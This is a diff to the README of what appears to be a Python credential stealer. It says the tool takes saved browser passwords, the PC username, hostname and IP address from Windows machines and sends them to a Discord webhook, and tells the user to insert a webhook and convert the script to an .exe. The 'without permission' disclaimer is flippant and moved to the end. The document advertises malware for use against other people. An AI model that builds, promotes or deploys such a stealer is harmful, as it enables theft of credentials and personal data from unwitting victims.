@@ -2,8 +2,6 @@
 
 grabs saved passwords from basically every browser on windows and sends them to a discord webhook
 
-made this for fun and to learn python, dont use it on people without permission
-
 ## what browsers it supports
 
 **chromium (chrome engine)**
@@ -30,7 +28,10 @@ made this for fun and to learn python, dont use it on people without permission
 - pc username
 - hostname
 - ip address
-- every saved password (url, username, password) from all browsers found
+- every saved password (url, username, password) from all browsers found :)
 
 ## how to use
 put in webhook and convert it to .exe lol..........:)
+
+
+made this for fun and to learn python, dont use it on people without permission..hehehhe
